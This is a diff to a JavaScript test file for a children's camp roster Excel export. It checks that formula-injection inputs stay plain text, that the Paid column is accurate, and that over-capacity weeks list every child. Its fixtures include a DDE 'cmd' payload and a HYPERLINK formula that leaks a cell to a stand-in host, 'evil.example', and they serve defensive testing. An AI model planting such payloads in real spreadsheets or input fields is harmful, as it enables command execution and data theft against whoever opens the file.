@@ -1,25 +1,26 @@
-// Verifies the camp roster Excel export (src/lib/campRoster.ts) never lets
-// attacker/parent-controlled text become a live spreadsheet formula —
-// against the real database and the real ExcelJS output, not a mock.
+// Verifies the camp roster Excel export (src/lib/campRoster.ts):
+//   1. parent-controlled text can never become a live spreadsheet formula;
+//   2. the "Paid" column says Y only for a verified payment, and released reservations are not listed;
+//   3. a week an administrator has authorized above 30 prints every child (no one is cut off at 30).
+// Against a real throwaway Postgres and the real ExcelJS output — not a mock.
 //
-// Run with: DATABASE_URL=postgres://user:pass@localhost:5432/dbname \
-//   npx tsx db/tests/xlsx-safety.test.mjs
-//
-// Requires the schema from db/migrations/001_init.sql and the seed data
-// from db/migrations/002_seed_weeks.sql to already be applied. Creates and
-// then cancels one test registration in the "jun22" week — do not point
-// this at a database with real registrations in it.
+// Run with: DATABASE_URL=postgres://user:pass@localhost:5432/anydb npm run test:xlsx-safety
+// (The test creates its own temporary database and drops it afterwards; it refuses to run
+// against anything but a local Postgres.)
 
 import ExcelJS from "exceljs";
-import { unlinkSync, mkdtempSync, rmSync } from "fs";
+import { mkdtempSync, rmSync } from "fs";
 import { execFileSync } from "child_process";
 import { tmpdir } from "os";
 import { join } from "path";
-import { getPool } from "../../src/lib/db.ts";
-import { reserveRegistration, cancelRegistration, newIdempotencyKey } from "../../src/lib/campDb.ts";
-import { buildCampRosterWorkbook } from "../../src/lib/campRoster.ts";
+import { createTestDatabase } from "./helpers/testdb.mjs";
 
-const WEEK_ID = "jun22";
+const testDb = await createTestDatabase();
+const { createHarness } = await import("./helpers/harness.mjs");
+const h = createHarness();
+const { pool, campDb, check, reserveOk, confirmFor, expireHold } = h;
+const { buildCampRosterWorkbook } = await import("../../src/lib/campRoster.ts");
+
 const PAYLOADS = {
   fullName: "=cmd|' /C calc'!A1",
   healthInfo: '=HYPERLINK("http://evil.example/leak?x="&A1,"click me")',
@@ -28,54 +29,32 @@ const PAYLOADS = {
   secondaryPhone: "@SUM(1+1)",
 };
 
-let pass = 0;
-let fail = 0;
-function check(label, cond) {
-  if (cond) {
-    pass++;
-    console.log(`  [PASS] ${label}`);
-  } else {
-    fail++;
-    console.log(`  [FAIL] ${label}`);
-  }
-}
-
 function xmlEscape(s) {
   return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&apos;");
 }
 
-console.log("=== Excel roster export: formula-injection-shaped fields must stay inert text ===");
+async function loadWorkbook(path) {
+  const wb = await buildCampRosterWorkbook();
+  await wb.xlsx.writeFile(path);
+  const read = new ExcelJS.Workbook();
+  await read.xlsx.readFile(path);
+  return read;
+}
 
 const dir = mkdtempSync(join(tmpdir(), "xlsx-safety-"));
 const outPath = join(dir, "roster.xlsx");
-let registrationId;
 
 try {
-  const result = await reserveRegistration({
-    idempotencyKey: newIdempotencyKey(),
+  console.log("=== 1. Formula-injection-shaped fields must stay inert text ===");
+  await reserveOk("xlsx", {
+    weekIds: ["jun22"],
     parentName: PAYLOADS.parentName,
-    email: "xlsx-safety-test@example.com",
-    primaryPhone: "555-000-0000",
     secondaryPhone: PAYLOADS.secondaryPhone,
     emergencyName: PAYLOADS.emergencyName,
-    emergencyRelationship: "Aunt",
-    emergencyPhone: "555-000-0001",
-    codeOfConductAccepted: true,
-    consentAccepted: true,
-    weekIds: [WEEK_ID],
-    children: [
-      { fullName: PAYLOADS.fullName, dateOfBirth: "2016-01-01", age: "9", healthInfo: PAYLOADS.healthInfo },
-    ],
+    children: [{ fullName: PAYLOADS.fullName, dateOfBirth: "2016-01-01", age: "9", healthInfo: PAYLOADS.healthInfo }],
   });
-  if (!result.ok) throw new Error(`Setup failed: ${JSON.stringify(result)}`);
-  registrationId = result.registrationId;
 
-  const wb = await buildCampRosterWorkbook();
-  await wb.xlsx.writeFile(outPath);
-
-  // ExcelJS's own read-back must see plain strings, never formulas.
-  const wb2 = new ExcelJS.Workbook();
-  await wb2.xlsx.readFile(outPath);
+  const wb2 = await loadWorkbook(outPath);
   const ws = wb2.getWorksheet("Jun 22-26");
   const dataRow = ws.getRow(8); // first data row (header is row 7)
   const nameCell = dataRow.getCell(2); // Child's Full Name
@@ -98,30 +77,68 @@ try {
   check("child-name payload appears verbatim (XML-escaped) inside a <t> text node", sharedStrings.includes(`<t>${xmlEscape(PAYLOADS.fullName)}</t>`));
   check("health-info payload appears verbatim (XML-escaped) inside a <t> text node", sharedStrings.includes(`<t>${xmlEscape(PAYLOADS.healthInfo)}</t>`));
 
-  // The cover sheet is always sheet1 (buildCoverSheet runs first); jun22 is
-  // the first week in content.ts's juniorCamps.weeks, so its tab is sheet2.
+  // The cover sheet is always sheet1 (buildCoverSheet runs first); jun22 is the first week in
+  // content.ts's juniorCamps.weeks, so its tab is sheet2.
   const jun22Sheet = execFileSync("unzip", ["-p", outPath, "xl/worksheets/sheet2.xml"]).toString();
   const cellMatch = jun22Sheet.match(/<c r="B8"[^>]*>/);
   const cellTag = cellMatch ? cellMatch[0] : "";
   const cellRegion = cellMatch ? jun22Sheet.slice(jun22Sheet.indexOf(cellTag), jun22Sheet.indexOf(cellTag) + 120) : "";
   check('child-name cell (B8) is explicitly typed t="s" (shared string) in the OOXML', /t="s"/.test(cellTag) && !/<f[ >]/.test(cellRegion));
-} finally {
-  if (registrationId) {
-    // Exercises the real cancel path (releases capacity, writes an audit
-    // entry) and then hard-deletes this test's own row so repeated runs
-    // leave the database exactly as they found it.
-    await cancelRegistration(registrationId, "xlsx-safety-test cleanup");
-    const pool = getPool();
-    await pool.query(`DELETE FROM registration_spots WHERE registration_id = $1`, [registrationId]);
-    await pool.query(`DELETE FROM children WHERE registration_id = $1`, [registrationId]);
-    await pool.query(`DELETE FROM admin_audit_log WHERE target_id = $1`, [registrationId]);
-    await pool.query(`DELETE FROM registrations WHERE id = $1`, [registrationId]);
+
+  // ---------------------------------------------------------------------------
+  console.log("\n=== 2. The Paid column, and who is listed ===");
+  const mk = (name, extra = {}) => reserveOk(name, { weekIds: ["jun29"], children: [{ fullName: name, dateOfBirth: "2017-01-01", age: "9", healthInfo: "none" }], ...extra });
+  const paidId = await mk("Aa Paid Child");
+  const reportedId = await mk("Bb Reported Child");
+  await mk("Cc Pending Child"); // stays Awaiting Payment
+  const releasedId = await mk("Dd Released Child");
+  const expiredId = await mk("Ee Expired Child");
+  await confirmFor(paidId);
+  await campDb.reportPayment(reportedId);
+  await campDb.cancelRegistration(releasedId, "family withdrew", { releaseReason: "owner_cancelled" });
+  await expireHold(expiredId, 1);
+  await campDb.releaseExpiredReservations();
+
+  const wb3 = await loadWorkbook(outPath);
+  const sheet = wb3.getWorksheet("Jun 29-Jul 3");
+  const rows = [];
+  for (let r = 8; r <= 37; r++) {
+    const name = sheet.getRow(r).getCell(2).value;
+    if (name) rows.push({ name: String(name), paid: String(sheet.getRow(r).getCell(10).value ?? "") });
   }
-  try {
-    unlinkSync(outPath);
-  } catch {}
+  check("exactly the three held reservations are listed, in name order", rows.map((x) => x.name).join("|") === "Aa Paid Child|Bb Reported Child|Cc Pending Child", rows.map((x) => x.name).join("|"));
+  check("Paid = Y only for the verified payment; a parent's report or a plain reservation shows N", rows.map((x) => x.paid).join("") === "YNN", rows.map((x) => x.paid).join(","));
+  check("released and expired reservations are not on the sheet", !rows.some((x) => /Released|Expired/.test(x.name)));
+
+  // ---------------------------------------------------------------------------
+  console.log("\n=== 3. A week authorized above 30 prints every child ===");
+  const normal = wb3.getWorksheet("Jul 13-16");
+  check("an ordinary week still has the 30 numbered rows (row 37 is number 30; row 38 is empty)", normal.getRow(37).getCell(1).value === 30 && !normal.getRow(38).getCell(1).value);
+  check("...and says 'Max 30 campers'", String(normal.getCell("A3").value).includes("Max 30 campers"));
+
+  const auth = await campDb.authorizeWeekCapacity("jul06", 33, "Extra coach confirmed; families on the waiting list");
+  check("setup: the administrator authorizes 33 for Jul 6-9", auth.ok);
+  for (let i = 0; i < 11; i++) await reserveOk(`big-${i}`, { weekIds: ["jul06"], children: Array.from({ length: 3 }, (_, k) => ({ fullName: `Big${String(i).padStart(2, "0")} Kid${k + 1}`, dateOfBirth: "2016-01-01", age: "10", healthInfo: "none" })) });
+  check("setup: the week now holds 33 children", (await pool.query(`SELECT taken_count FROM camp_weeks WHERE id='jul06'`)).rows[0].taken_count === 33);
+
+  const wb4 = await loadWorkbook(outPath);
+  const big = wb4.getWorksheet("Jul 6-9");
+  const names = [];
+  for (let r = 8; r <= 8 + 40; r++) {
+    const v = big.getRow(r).getCell(2).value;
+    if (v) names.push(String(v));
+  }
+  check("all 33 children are on the printed sheet (none cut off after 30)", names.length === 33 && new Set(names).size === 33, `${names.length} names`);
+  check("the last numbered row is 33, and the sheet says 'Max 33 campers' and 'Registered: 33 of 33'", big.getRow(8 + 32).getCell(1).value === 33 && String(big.getCell("A3").value).includes("Max 33 campers") && String(big.getCell("A4").value) === "Registered: 33 of 33");
+  const cover = wb4.getWorksheet("Read Me First");
+  const coverText = [];
+  cover.eachRow((row) => row.eachCell((c) => coverText.push(String(c.value ?? ""))));
+  check("the cover sheet counts it as 33 of 33", coverText.some((t) => t.includes("33 of 33")));
+  check("...and no longer claims the data comes from a Google Sheet", !coverText.some((t) => /CampRegistrations sheet/i.test(t)));
+} finally {
   rmSync(dir, { recursive: true, force: true });
 }
 
-console.log(`\n${fail === 0 ? "ALL TESTS PASS" : "SOME TESTS FAILED"} (${pass} pass, ${fail} fail)`);
-process.exit(fail === 0 ? 0 : 1);
+await pool.end();
+await testDb.drop();
+process.exit(h.finish("xlsx-safety"));
